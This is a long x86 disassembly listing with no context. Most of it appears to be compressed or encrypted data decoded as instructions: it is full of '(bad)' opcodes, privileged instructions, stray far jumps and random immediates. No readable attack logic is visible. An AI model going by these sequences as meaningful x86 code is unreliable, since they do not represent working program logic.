  41efea:	rcl    DWORD PTR [edi],0xcd
  41efed:	or     al,0xa1
  41efef:	add    BYTE PTR [eax],al
  41eff1:	clc    
  41eff2:	leave  
  41eff3:	dec    esi
  41eff4:	dec    edi
  41eff5:	add    edi,eax
  41eff7:	and    ch,dl
  41eff9:	ja     0x41f015
  41effb:	jo     0x41effa
  41effd:	sti    
  41effe:	jl     0x41efd4
  41f000:	jle    0x41ef83
  41f002:	push   ebp
  41f003:	pop    es
  41f004:	ins    BYTE PTR es:[edi],dx
  41f005:	and    ch,BYTE PTR [esi]
  41f007:	icebp  
  41f008:	add    bl,BYTE PTR [ebx-0x23]
  41f00b:	adc    edx,DWORD PTR [ecx+0x3960026c]
  41f011:	inc    esp
  41f012:	xchg   ebx,eax
  41f013:	add    BYTE PTR [eax],al
  41f015:	and    al,0xdb
  41f017:	or     DWORD PTR [ebx-0x6fd10579],0xa1d4598d
  41f021:	sub    bl,BYTE PTR [ecx-0x22bc6917]
  41f027:	in     eax,dx
  41f028:	test   DWORD PTR [edi-0x1c],eax
  41f02b:	push   esp
  41f02c:	mov    dl,0x7
  41f02e:	paddsw mm1,QWORD PTR [eax-0x11ffff75]
  41f035:	jae    0x41f059
  41f037:	mov    edx,0x3908b5ec
  41f03c:	add    BYTE PTR [eax],al
  41f03e:	adc    BYTE PTR [ebx-0x47bfab08],bh
  41f044:	add    BYTE PTR [eax],al
  41f046:	shl    ecx,1
  41f048:	pop    ecx
  41f049:	mov    edi,0xc42f3a3b
  41f04e:	jmp    0xf979:0xa79f0000
  41f055:	leave  
  41f056:	push   ds
  41f057:	jmp    0x41f08e
  41f059:	inc    eax
  41f05a:	mov    ch,0x0
  41f05c:	add    BYTE PTR [ecx-0x72],bh
  41f05f:	pusha  
  41f060:	mov    ds:0xa083c7ef,al
  41f065:	in     eax,0x8f
  41f067:	in     eax,0xd5
  41f069:	or     al,0x43
  41f06b:	add    BYTE PTR [eax],al
  41f06d:	lea    edi,[edx-0x9]
  41f070:	(bad)  
  41f072:	ret    
  41f073:	add    al,ah
  41f075:	push   esi
  41f076:	add    BYTE PTR [eax],al
  41f078:	(bad)  
  41f07a:	jb     0x41f056
  41f07c:	imul   edx,DWORD PTR [edi],0x9a48cf79
  41f082:	add    BYTE PTR [eax],al
  41f084:	imul   edx,ecx,0x11
  41f087:	enter  0x31,0x0
  41f08b:	jmp    0x42b914
  41f090:	dec    eax
  41f091:	pusha  
  41f092:	add    BYTE PTR [eax],al
  41f094:	leave  
  41f095:	jne    0x41f0b1
  41f097:	xor    al,0xac
  41f099:	sbb    eax,esi
  41f09b:	arpl   cx,bx
  41f09d:	push   es
  41f09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f09f:	(bad)  
  41f0a0:	sbb    bh,BYTE PTR [ebx-0x21]
  41f0a3:	addr16 push esp
  41f0a5:	or     esp,esi
  41f0a7:	out    0x8,eax
  41f0a9:	ins    DWORD PTR es:[edi],dx
  41f0aa:	add    BYTE PTR [eax],al
  41f0ac:	mov    es,WORD PTR [ebp-0x37f0a71]
  41f0b2:	add    BYTE PTR [eax],al
  41f0b4:	pop    ebx
  41f0b5:	test   dh,0x95
  41f0b8:	mov    dl,ah
  41f0ba:	xchg   ebp,eax
  41f0bb:	sahf   
  41f0bc:	popa   
  41f0bd:	inc    esp
  41f0be:	pop    ebp
  41f0bf:	add    BYTE PTR [eax],al
  41f0c1:	or     al,0xcb
  41f0c3:	add    BYTE PTR [eax],al
  41f0c5:	ret    0x1f27
  41f0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0cb:	mov    eax,0x3ccc16d0
  41f0d0:	add    BYTE PTR [eax],al
  41f0d2:	inc    ecx
  41f0d3:	sbb    ah,al
  41f0d5:	jo     0x41f05f
  41f0d7:	or     eax,0x685f0000
  41f0dc:	daa    
  41f0dd:	js     0x41f147
  41f0df:	sti    
  41f0e0:	jle    0x41f0ba
  41f0e2:	xchg   ecx,eax
  41f0e3:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f0e5:	(bad)  
  41f0e6:	shl    BYTE PTR [edi+0x0],0x0
  41f0ea:	jle    0x41f0c2
  41f0ec:	ja     0x41f0cc
  41f0ee:	mov    DWORD PTR [edx],edx
  41f0f0:	mov    ?,WORD PTR [esi+0x11399f1c]
  41f0f6:	and    BYTE PTR [esi+eax*4+0x69],dh
  41f0fa:	push   ecx
  41f0fb:	sub    al,0x4c
  41f0fd:	jl     0x41f0ff
  41f0ff:	add    BYTE PTR [eax+0x3d],bl
  41f102:	and    esi,DWORD PTR [esi]
  41f104:	xor    al,0x5b
  41f106:	xchg   esp,eax
  41f107:	inc    esi
  41f108:	or     dl,BYTE PTR [ebp-0x20]
  41f10b:	daa    
  41f10c:	mov    edi,0x7776a4eb
  41f111:	mov    dl,0xf8
  41f113:	ins    DWORD PTR es:[edi],dx
  41f114:	sbb    ebp,DWORD PTR [eax+0x60]
  41f117:	ret    
  41f118:	ins    DWORD PTR es:[edi],dx
  41f119:	aad    0xea
  41f11b:	dec    esi
  41f11c:	inc    ecx
  41f11d:	mov    ds:0xe1977e52,al
  41f122:	mov    ebx,0xf80a0225
  41f127:	fisttp WORD PTR [ecx]
  41f129:	push   cs
  41f12a:	push   cs
  41f12b:	out    0x6f,al
  41f12d:	and    eax,0xcbae1cfc
  41f132:	and    ecx,0xfffffffc
  41f135:	test   eax,0x5cec070b
  41f13a:	arpl   bx,sp
  41f13c:	mov    edx,0xc2c0
  41f141:	mov    ds:0xce805f7a,eax
  41f146:	add    BYTE PTR [eax],al
  41f148:	adc    edi,DWORD PTR [esp+edx*4-0x3e2185b3]
  41f14f:	or     ebx,esi
  41f151:	shl    DWORD PTR [edx],1
  41f153:	mov    cl,0x50
  41f155:	mov    eax,0xab89b569
  41f15a:	loopne 0x41f1b1
  41f15c:	in     al,0x32
  41f15e:	(bad)  
  41f15f:	cmc    
  41f160:	nop
  41f161:	mov    ecx,ecx
  41f163:	cmp    eax,0x11e21c96
  41f168:	icebp  
  41f169:	mov    BYTE PTR [eax],cl
  41f16b:	add    BYTE PTR [eax],al
  41f16d:	jb     0x41f113
  41f16f:	pop    eax
  41f170:	enter  0x61,0x0
  41f174:	scas   al,BYTE PTR es:[edi]
  41f175:	sbb    eax,DWORD PTR [ebx-0x5abf7d36]
  41f17b:	add    BYTE PTR [eax],al
  41f17d:	dec    eax
  41f17e:	fld    DWORD PTR [eax]
  41f180:	add    BYTE PTR [esi],ah
  41f182:	cld    
  41f183:	jbe    0x41f1f0
  41f185:	xchg   esp,eax
  41f186:	into   
  41f187:	dec    ebx
  41f188:	lahf   
  41f189:	inc    esi
  41f18a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f18b:	fld    st(6)
  41f18d:	ficom  WORD PTR [eax]
  41f18f:	xor    ah,ah
  41f191:	jl     0x41f138
  41f193:	mov    dh,0x6c
  41f195:	xchg   ebp,eax
  41f196:	pop    ebx
  41f197:	inc    ecx
  41f198:	or     BYTE PTR [eax+eax*1+0x0],cl
  41f19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f19d:	idiv   BYTE PTR [esi+0x56f11e21]
  41f1a3:	cwde   
  41f1a4:	sbb    dl,BYTE PTR [edx+0x1c]
  41f1a7:	mov    al,ds:0xc3796d46
  41f1ac:	icebp  
  41f1ad:	inc    ebx
  41f1ae:	fdiv   DWORD PTR [ecx+0x302a41cf]
  41f1b4:	fbld   TBYTE PTR [edx]
  41f1b6:	jne    0x41f148
  41f1b8:	(bad)  
  41f1b9:	cmp    DWORD PTR [ecx-0x1613e1fb],edx
  41f1bf:	pop    edx
  41f1c0:	pop    esp
  41f1c1:	xor    al,0x1a
  41f1c3:	shl    DWORD PTR [edi-0x2f3fe5a1],cl
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	cmp    al,BYTE PTR [edi]
  41f1cd:	mov    esp,0xc2c4
  41f1d2:	popf   
  41f1d3:	data16 (bad) 
  41f1d5:	hlt    
  41f1d6:	add    BYTE PTR [eax],al
  41f1d8:	scas   eax,DWORD PTR es:[edi]
  41f1d9:	pop    edx
  41f1da:	or     ebp,DWORD PTR [ecx+0x4e]
  41f1dd:	adc    BYTE PTR [eax],al
  41f1df:	xchg   esp,eax
  41f1e0:	add    BYTE PTR [eax],al
  41f1e2:	xchg   ebx,eax
  41f1e3:	cli    
  41f1e4:	or     DWORD PTR [esi],esp
  41f1e6:	pop    ss
  41f1e7:	shr    BYTE PTR [eax*1+0x4681e2e2],1
  41f1ee:	into   
  41f1ef:	inc    ebp
  41f1f0:	push   0x50
  41f1f2:	jmp    0x1418dae9
  41f1f7:	(bad)  
  41f1f9:	stos   BYTE PTR es:[edi],al
  41f1fa:	fild   QWORD PTR [ebx]
  41f1fc:	mov    ch,0x28
  41f1fe:	add    ebp,eax
  41f200:	jmp    0x23e1628f
  41f205:	dec    edi
  41f207:	mov    eax,0x31772ea5
  41f20c:	cld    
  41f20d:	mov    esp,DWORD PTR [edi]
  41f20f:	repz not BYTE PTR [ebp-0x1c]
  41f213:	(bad)  
  41f214:	xchg   ebp,eax
  41f215:	lods   eax,DWORD PTR ds:[esi]
  41f216:	pop    ds
  41f217:	ds ds push esi
  41f21a:	dec    BYTE PTR [edx]
  41f21c:	inc    edx
  41f21d:	push   ecx
  41f21e:	clc    
  41f21f:	loopne 0x41f243
  41f221:	outs   dx,DWORD PTR ds:[esi]
  41f222:	lds    edi,FWORD PTR [ecx-0x1e]
  41f225:	push   cs
  41f226:	xchg   BYTE PTR [eax],bl
  41f228:	xchg   esp,eax
  41f229:	ficom  DWORD PTR [edi+0x11be4101]
  41f22f:	push   edi
  41f230:	xor    ch,bh
  41f232:	mov    ds:0x1f08,al
  41f237:	cmp    ch,BYTE PTR [edi+esi*1+0xb70c]
  41f23e:	or     al,0x4d
  41f240:	add    BYTE PTR [eax],al
  41f242:	call   0x7af8:0x7a011d15
  41f249:	jmp    0x9a33664a
  41f24e:	lahf   
  41f24f:	arpl   WORD PTR [edx],sp
  41f251:	or     ebp,DWORD PTR [edi]
  41f253:	jo     0x41f279
  41f255:	jmp    0x41c0:0xd8de7d5d
  41f25c:	add    BYTE PTR [eax],al
  41f25e:	loope  0x41f21e
  41f260:	shr    DWORD PTR [ecx-0x4f3908d1],cl
  41f266:	scas   al,BYTE PTR es:[edi]
  41f267:	fist   DWORD PTR [edi+0x0]
  41f26a:	add    DWORD PTR [eax],0x0
  41f26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f26e:	test   DWORD PTR es:[esi+esi*4-0x71920000],ecx
  41f276:	inc    esp
  41f277:	stc    
  41f278:	add    BYTE PTR [eax],al
  41f27a:	stos   BYTE PTR es:[edi],al
  41f27b:	scas   eax,DWORD PTR es:[edi]
  41f27c:	retf   0xd1de
  41f27f:	mov    al,0x1a
  41f281:	int    0xf4
  41f283:	xacquire xchg DWORD PTR [edi+0x5f],esp
  41f287:	push   ds
  41f288:	iret   
  41f289:	imul   ebp,DWORD PTR [edi],0xffffffc5
  41f28c:	mov    DWORD PTR [ecx+0x68e63a1],0xfa2f0a27
  41f296:	push   edx
  41f297:	jnp    0x41f305
  41f299:	out    dx,al
  41f29a:	inc    esp
  41f29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f29c:	add    BYTE PTR [eax],al
  41f29e:	ret    0x9d1d
  41f2a1:	popf   
  41f2a2:	es out 0x18,eax
  41f2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a6:	enter  0x2d,0x0
  41f2aa:	or     BYTE PTR [eax+0x51dd0000],cl
  41f2b0:	sbb    eax,0x6eb28549
  41f2b5:	sbb    eax,0x66cfb1d6
  41f2ba:	cmp    DWORD PTR [edx-0x15],ebp
  41f2bd:	add    al,0xaa
  41f2bf:	add    BYTE PTR [eax],al
  41f2c1:	mov    ebx,0xdc8957f9
  41f2c6:	cmp    al,0x64
  41f2c8:	retf   
  41f2c9:	xchg   esp,eax
  41f2ca:	pop    ss
  41f2cb:	in     eax,dx
  41f2cc:	mov    dl,0x2f
  41f2ce:	cmc    
  41f2cf:	dec    ebx
  41f2d0:	adc    eax,DWORD PTR [ecx-0x74fd0724]
  41f2d6:	ins    BYTE PTR es:[edi],dx
  41f2d7:	mov    edi,0x26c0
  41f2dc:	popa   
  41f2dd:	cmp    al,0xf1
  41f2df:	std    
  41f2e0:	(bad)  
  41f2e1:	xchg   ebp,eax
  41f2e2:	or     DWORD PTR [ecx],edi
  41f2e4:	sbb    ah,BYTE PTR [edx-0x5db3e17a]
  41f2ea:	add    BYTE PTR [eax],al
  41f2ec:	jnp    0x41f2f9
  41f2ee:	sub    bl,BYTE PTR [edi]
  41f2f0:	mov    DWORD PTR [edx+0x77],ebp
  41f2f3:	test   bh,bl
  41f2f5:	add    BYTE PTR [eax],al
  41f2f7:	pop    ss
  41f2f8:	(bad)  [edi]
  41f2fa:	push   es
  41f2fb:	repnz sub dl,ch
  41f2fe:	push   ds
  41f2ff:	iret   
  41f300:	pop    edx
  41f301:	inc    edi
  41f302:	push   eax
  41f303:	(bad)  
  41f304:	and    al,0xa2
  41f306:	sti    
  41f307:	jg     0x41f2c0
  41f309:	sar    BYTE PTR ss:[ecx],cl
  41f30c:	push   ebp
  41f30d:	add    cl,BYTE PTR [eax-0x1ffff50]
  41f313:	cdq    
  41f314:	pushf  
  41f315:	pop    ebp
  41f316:	mov    al,ds:0xb44e5f6a
  41f31b:	outs   dx,BYTE PTR ds:[esi]
  41f31c:	xchg   ebx,eax
  41f31d:	dec    esp
  41f31e:	mov    bl,0x0
  41f320:	add    BYTE PTR [edx+ebx*2],al
  41f323:	add    BYTE PTR [eax],al
  41f325:	data16 jo 0x41f2bb
  41f328:	lods   al,BYTE PTR ds:[esi]
  41f329:	inc    edi
  41f32a:	scas   al,BYTE PTR es:[edi]
  41f32b:	rcl    dl,1
  41f32d:	xchg   esi,eax
  41f32e:	cmp    dl,BYTE PTR [ecx]
  41f330:	xchg   ecx,eax
  41f331:	ss adc al,0x27
  41f334:	dec    ebp
  41f335:	jo     0x41f357
  41f337:	mov    esi,0x8c2f4f78
  41f33c:	loopne 0x41f33e
  41f33e:	add    BYTE PTR [ebp+0x8],ah
  41f341:	xor    al,BYTE PTR [eax]
  41f343:	add    bl,dl
  41f345:	nop
  41f346:	adc    al,0x48
  41f348:	imul   eax,DWORD PTR [eax],0x0
  41f34b:	adc    eax,0x9c80
  41f350:	or     al,0xf0
  41f352:	add    BYTE PTR [eax],al
  41f354:	aas    
  41f355:	push   ebp
  41f356:	rcl    BYTE PTR [eax+0x38],1
  41f359:	xor    DWORD PTR [esi+0x49],0xeec2c57f
  41f360:	sub    DWORD PTR [eax+0x31],0xfffffff0
  41f364:	mov    edx,0xbd7496cf
  41f369:	mov    esp,0xad4c
  41f36e:	inc    ebx
  41f36f:	add    esi,esp
  41f371:	pop    ss
  41f372:	inc    esp
  41f373:	mov    eax,DWORD PTR [eax]
  41f375:	add    BYTE PTR [ecx+ebx*4],al
  41f378:	add    BYTE PTR [eax],al
  41f37a:	ins    BYTE PTR es:[edi],dx
  41f37b:	mov    ch,0xaf
  41f37d:	leave  
  41f37e:	dec    esp
  41f37f:	mov    esi,0x320a0000
  41f384:	and    eax,0x212bad7b
  41f389:	pop    eax
  41f38a:	jp     0x41f3c9
  41f38c:	bts    DWORD PTR [ebx],edi
  41f38f:	stos   DWORD PTR es:[edi],eax
  41f390:	sysexit 
  41f392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f393:	scas   al,BYTE PTR es:[edi]
  41f394:	stos   BYTE PTR es:[edi],al
  41f395:	inc    esp
  41f396:	lods   al,BYTE PTR ds:[esi]
  41f397:	add    BYTE PTR [eax],al
  41f399:	fs dec ebx
  41f39b:	jecxz  0x41f3eb
  41f39d:	arpl   WORD PTR [eax-0xe3e4fc1],bx
  41f3a3:	not    BYTE PTR ss:[ebx+0x5271b778]
  41f3aa:	cmc    
  41f3ab:	(bad)  
  41f3ad:	jb     0x41f3bf
  41f3af:	xchg   ebx,eax
  41f3b0:	pop    edx
  41f3b1:	and    eax,ecx
  41f3b3:	cwde   
  41f3b4:	add    BYTE PTR [eax],al
  41f3b6:	mov    dl,0xad
  41f3b8:	retf   0xc640
  41f3bb:	add    BYTE PTR [eax],al
  41f3bd:	push   ss
  41f3be:	or     DWORD PTR [ebp+0xfb89e7d],esi
  41f3c4:	mov    ds:0xe25b28e0,eax
  41f3c9:	fwait
  41f3ca:	push   es
  41f3cb:	xor    eax,0x90cc5b
  41f3d0:	add    BYTE PTR [edx-0x446be543],al
  41f3d6:	test   al,cl
  41f3d8:	add    BYTE PTR [eax],al
  41f3da:	je     0x41f3c8
  41f3dc:	stos   BYTE PTR es:[edi],al
  41f3dd:	shr    BYTE PTR [ecx+edx*4-0x6402de7e],1
  41f3e4:	push   0x5b
  41f3e6:	or     al,0xcd
  41f3e8:	add    BYTE PTR [eax],al
  41f3ea:	pop    ebp
  41f3eb:	leave  
  41f3ec:	dec    edx
  41f3ed:	in     al,dx
  41f3ee:	rol    DWORD PTR [esi-0x7ecb0b3],1
  41f3f4:	dec    esp
  41f3f5:	jle    0x41f3f7
  41f3f7:	add    BYTE PTR [edi],dl
  41f3f9:	in     eax,0x7d
  41f3fb:	sahf   
  41f3fc:	pop    ss
  41f3fd:	sub    al,0x41
  41f3ff:	je     0x41f432
  41f401:	mov    edx,ss
  41f403:	add    BYTE PTR [eax],al
  41f405:	outs   dx,BYTE PTR ds:[esi]
  41f406:	in     al,0x64
  41f408:	call   0x124347e
  41f40d:	add    BYTE PTR [edx],dl
  41f40f:	retf   
  41f410:	leave  
  41f411:	inc    ebx
  41f412:	sub    edx,eax
  41f414:	dec    ebx
  41f415:	inc    ebx
  41f416:	and    eax,0x808194bc
  41f41b:	mov    DWORD PTR [eax],0x54ab6a00
  41f421:	jne    0x41f450
  41f423:	sbb    DWORD PTR [ebx],ebx
  41f425:	fdiv   QWORD PTR [ebp-0x3e]
  41f428:	rcr    edi,cl
  41f42a:	mov    edi,ss
  41f42c:	add    BYTE PTR [eax],al
  41f42e:	(bad)  
  41f42f:	retf   
  41f430:	xchg   edi,eax
  41f431:	fidiv  DWORD PTR [edi-0x35]
  41f434:	mov    edi,0xbfdfd5ef
  41f439:	sub    BYTE PTR [esi+0x35],ch
  41f43c:	ss mov gs,edx
  41f43f:	ficomp WORD PTR [ebx-0xd6a22d0]
  41f445:	and    ecx,esp
  41f447:	fild   DWORD PTR [eax]
  41f449:	add    BYTE PTR [eax-0x18],bh
  41f44c:	mov    ebp,0xcf18f409
  41f451:	jmp    0x871d:0x16e44ed7
  41f458:	loope  0x41f445
  41f45a:	xor    al,0xe0
  41f45c:	dec    edx
  41f45d:	dec    ecx
  41f45e:	xchg   BYTE PTR [esi+edi*4+0x60],bl
  41f462:	and    al,0x6a
  41f464:	mov    ds:0xa0c45b,al
  41f469:	add    dh,dl
  41f46b:	or     DWORD PTR [eax-0x2c],edx
  41f46e:	(bad)  
  41f470:	outs   dx,BYTE PTR ds:[esi]
  41f471:	add    BYTE PTR [eax],al
  41f473:	pop    ds
  41f474:	jno    0x41f414
  41f476:	outs   dx,DWORD PTR ds:[esi]
  41f477:	mov    esp,0xc304
  41f47c:	pusha  
  41f47d:	mov    edi,0x2c8
  41f482:	iret   
  41f483:	iret   
  41f484:	jo     0x41f4ae
  41f486:	gs push esi
  41f488:	pop    eax
  41f489:	mov    bh,0x21
  41f48b:	jnp    0x41f443
  41f48d:	sbb    ebp,0xa053a9de
  41f493:	repz shr BYTE PTR [edi],cl
  41f496:	sub    al,0x2f
  41f498:	dec    ebp
  41f499:	stos   BYTE PTR es:[edi],al
  41f49a:	ds xchg esi,eax
  41f49c:	push   0xffffffdb
  41f49e:	inc    ecx
  41f49f:	inc    esp
  41f4a0:	and    eax,0xaf950000
  41f4a5:	scas   eax,DWORD PTR es:[edi]
  41f4a6:	mov    WORD PTR [esi],fs
  41f4a8:	add    BYTE PTR [eax],al
  41f4aa:	pop    es
  41f4ab:	in     eax,dx
  41f4ac:	inc    ebp
  41f4ad:	add    esp,DWORD PTR [edx+0x11]
  41f4b0:	call   FWORD PTR [esi-0x2470639a]
  41f4b6:	mov    ebx,0x78830a09
  41f4bb:	adc    edx,eax
  41f4bd:	outs   dx,DWORD PTR ds:[esi]
  41f4be:	repz sbb eax,0xd46e58d4
  41f4c4:	not    BYTE PTR [edi+ebx*1]
  41f4c7:	mov    ds:0xb3429130,al
  41f4cc:	stc    
  41f4cd:	jno    0x41f4ca
  41f4cf:	stos   BYTE PTR es:[edi],al
  41f4d0:	mov    esp,0xd323e765
  41f4d5:	push   ecx
  41f4d6:	xchg   edx,eax
  41f4d7:	sub    BYTE PTR [eax],dh
  41f4d9:	adc    DWORD PTR [edi-0x4a],0xffffff94
  41f4dd:	popf   
  41f4de:	sbb    dl,bh
  41f4e0:	mov    edi,0x6bc8ee
  41f4e5:	add    BYTE PTR [ecx+eiz*2+0x78],ah
  41f4e9:	sub    al,0xf
  41f4eb:	(bad)  
  41f4ed:	jmp    0x41f506
  41f4ef:	sbb    BYTE PTR [ebp-0x35],bl
  41f4f2:	cld    
  41f4f3:	sbb    esp,0xffffffc4
  41f4f6:	loopne 0x41f4f8
  41f4f8:	add    BYTE PTR [ebx*1+0x25219af1],dh
  41f4ff:	xor    DWORD PTR [edi],ecx
  41f501:	jg     0x41f4cb
  41f503:	adc    al,0x0
  41f505:	add    BYTE PTR [eax],al
  41f507:	add    BYTE PTR ss:[eax],al
  41f50a:	je     0x41f572
  41f50c:	leave  
  41f50d:	sub    dh,BYTE PTR [ecx-0xdac5c13]
  41f513:	mov    ecx,0x632c4af1
  41f518:	adc    DWORD PTR [ebx],0xf4debe50
  41f51e:	or     edx,edi
  41f520:	fcomip st,st(4)
  41f522:	cmp    eax,0xc5ca8e8a
  41f527:	xchg   ebx,eax
  41f528:	nop
  41f529:	fneni(8087 only) 
  41f52b:	mov    dl,0x34
  41f52d:	cmp    BYTE PTR [eax-0x4cffff39],cl
  41f533:	lods   al,BYTE PTR ds:[esi]
  41f534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f535:	sbb    cl,BYTE PTR [edx]
  41f537:	ins    BYTE PTR es:[edi],dx
  41f538:	int3   
  41f539:	out    0x0,eax
  41f53b:	add    BYTE PTR [esi-0x7f],al
  41f53e:	retf   
  41f53f:	call   0xe78d53ff
  41f544:	mov    eax,0x81909795
  41f549:	jo     0x41f4eb
  41f54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f54c:	cli    
  41f54d:	in     eax,dx
  41f54e:	sti    
  41f54f:	push   eax
  41f550:	imul   BYTE PTR [edx-0x4350097d]
  41f556:	stos   BYTE PTR es:[edi],al
  41f557:	daa    
  41f558:	call   0xc6ce1b86
  41f55d:	add    BYTE PTR [eax],al
  41f55f:	(bad)  [ecx]
  41f561:	adc    DWORD PTR [eax],edx
  41f563:	rcr    DWORD PTR [eax],cl
  41f565:	ins    DWORD PTR es:[edi],dx
  41f566:	mov    dl,0x3e
  41f568:	pop    ecx
  41f569:	mov    bh,0x49
  41f56b:	jmp    0x2a6c355d
  41f570:	scas   al,BYTE PTR es:[edi]
  41f571:	xlat   BYTE PTR ds:[ebx]
  41f572:	mov    edi,DWORD PTR ds:0x9a0d61b7
  41f578:	push   ds
  41f579:	ret    0x194f
  41f57c:	or     ah,BYTE PTR [ebp+0x29fe8f71]
  41f582:	popa   
  41f583:	add    dh,ch
  41f585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f586:	outs   dx,BYTE PTR ds:[esi]
  41f587:	xlat   BYTE PTR ds:[ebx]
  41f588:	cmp    dh,ah
  41f58a:	js     0x41f58a
  41f58c:	cmp    bl,BYTE PTR [esi+0x78001e]
  41f592:	add    BYTE PTR [esi-0x1ba5f20c],al
  41f598:	ds xor eax,0x1fcbe1d5
  41f59e:	loop   0x41f57d
  41f5a0:	repnz push ds
  41f5a2:	dec    ecx
  41f5a3:	rol    BYTE PTR [edx+0x18720000],0x94
  41f5aa:	shr    DWORD PTR [ecx+0x1d],0x26
  41f5ae:	cli    
  41f5af:	mov    ah,0xea
  41f5b1:	mov    bh,0x63
  41f5b3:	in     al,dx
  41f5b4:	out    dx,al
  41f5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b6:	aas    
  41f5b7:	push   0x1
  41f5b9:	mov    bh,0x7f
  41f5bb:	js     0x41f5a9
  41f5bd:	cmp    esp,edi
  41f5bf:	mov    bh,0x5
  41f5c1:	sbb    BYTE PTR [ebx-0x6a1ea0da],cl
  41f5c7:	mov    cl,0xbb
  41f5c9:	xchg   ebp,eax
  41f5ca:	jmp    0x41f563
  41f5cc:	xchg   BYTE PTR [edx+0x2d],dl
  41f5cf:	stos   BYTE PTR es:[edi],al
  41f5d0:	dec    ebp
  41f5d1:	adc    ch,ch
  41f5d3:	adc    BYTE PTR [eax],dh
  41f5d5:	arpl   WORD PTR [edi+0x1a],si
  41f5d8:	(bad)  
  41f5d9:	pop    ecx
  41f5da:	fs stos BYTE PTR es:[edi],al
  41f5dc:	ret    0x6abc
  41f5df:	ds add ch,dl
  41f5e2:	jge    0x41f650
  41f5e4:	and    BYTE PTR [ebx],0x0
  41f5e7:	add    BYTE PTR [ecx],bl
  41f5e9:	jae    0x41f58a
  41f5eb:	sbb    ah,bh
  41f5ed:	in     eax,dx
  41f5ee:	mov    ds:0x6e6f850e,al
  41f5f3:	test   cl,cl
  41f5f5:	add    BYTE PTR [eax],al
  41f5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5f8:	out    dx,eax
  41f5f9:	cmp    dl,BYTE PTR [edx-0x2e1a4f55]
  41f5ff:	pop    ss
  41f600:	dec    ebp
  41f601:	mov    WORD PTR [edx+0x0],es
  41f604:	add    bl,al
  41f606:	or     bl,BYTE PTR [edi]
  41f608:	out    dx,al
  41f609:	arpl   WORD PTR [ecx-0x7f0f1802],si
  41f60f:	or     al,0x0
  41f611:	add    BYTE PTR [eax+edx*2+0x749373b4],bl
  41f618:	pusha  
  41f619:	mov    edx,0xd88b8906
  41f61e:	sbb    edx,DWORD PTR [edx+0x21]
  41f621:	adc    ecx,DWORD PTR [edi+0x7c119c4e]
  41f627:	fild   QWORD PTR [ebx+0x3e]
  41f62a:	mov    ds:0xb7d147a3,al
  41f62f:	hlt    
  41f630:	mov    esi,0xde2fdfa6
  41f635:	les    ecx,FWORD PTR [esi+0x0]
  41f638:	add    BYTE PTR [esi],bh
  41f63a:	jg     0x41f654
  41f63c:	shl    BYTE PTR [ebx-0x482cf60a],cl
  41f642:	fisttp WORD PTR [ebp+0x7e]
  41f646:	cs popa 
  41f648:	xor    eax,0xac073850
  41f64d:	sbb    cl,BYTE PTR [esp+ebx*4]
  41f650:	add    BYTE PTR [eax],al
  41f652:	out    0xd8,eax
  41f654:	imul   DWORD PTR ds:0xec6d5fea
  41f65a:	gs test ebx,edi
  41f65d:	cwde   
  41f65e:	mov    bh,0xd1
  41f660:	stos   BYTE PTR es:[edi],al
  41f661:	imul   ebx,DWORD PTR [edx],0xacc70626
  41f667:	jb     0x41f6d1
  41f669:	int3   
  41f66a:	xchg   ebx,eax
  41f66b:	add    BYTE PTR [eax],al
  41f66d:	popf   
  41f66e:	pop    edi
  41f66f:	test   eax,eax
  41f671:	inc    DWORD PTR [eax]
  41f673:	add    BYTE PTR [ecx-0x4],ch
  41f676:	xor    al,0xb3
  41f678:	leave  
  41f679:	sbb    eax,0x1a08
  41f67e:	or     eax,0xa1935738
  41f683:	ret    0xcfd4
  41f686:	mov    ds:0xbd476c1,al
  41f68b:	daa    
  41f68c:	mov    cl,0x5d
  41f68e:	cmp    esi,DWORD PTR [edi-0x40]
  41f691:	test   eax,0xdb0b0000
  41f696:	xchg   esp,eax
  41f697:	(bad)
  41f69a:	xchg   esp,eax
  41f69b:	cmp    al,0x78
  41f69d:	inc    ecx
  41f69e:	push   ss
  41f69f:	ja     0x41f68a
  41f6a1:	sbb    DWORD PTR [edx],0x4f
  41f6a4:	out    dx,eax
  41f6a5:	(bad)  
  41f6a6:	out    dx,eax
  41f6a7:	test   DWORD PTR [ecx-0x27],esp
  41f6aa:	lahf   
  41f6ab:	jmp    0x41f6f6
  41f6ad:	mov    eax,ds:0x81442e
  41f6b2:	add    dh,ch
  41f6b4:	mov    eax,0xa3cb9b5b
  41f6b9:	mov    cl,0xe4
  41f6bb:	xchg   ebx,eax
  41f6bc:	pushf  
  41f6bd:	ffree  st(0)
  41f6bf:	mov    dh,0x0
  41f6c1:	add    BYTE PTR [edi-0x6b2ae32d],cl
  41f6c7:	sub    BYTE PTR [ecx],al
  41f6c9:	arpl   WORD PTR [ebp+ebx*8-0x40],si
  41f6cd:	mov    edx,0xf55a0000
  41f6d2:	icebp  
  41f6d3:	cmc    
  41f6d4:	ficomp WORD PTR [ebp+0x83447a]
  41f6da:	add    BYTE PTR [eax],al
  41f6dc:	loop   0x41f6de
  41f6de:	add    BYTE PTR [ebx+0x1d7aea67],bh
  41f6e4:	call   0xe162:0x46d669fa
  41f6eb:	imul   ebp,DWORD PTR [esi],0x63
  41f6ee:	retf   0x2b84
  41f6f1:	add    BYTE PTR [eax],al
  41f6f3:	xchg   ecx,eax
  41f6f4:	je     0x41f6e7
  41f6f6:	loope  0x41f76a
  41f6f8:	push   esp
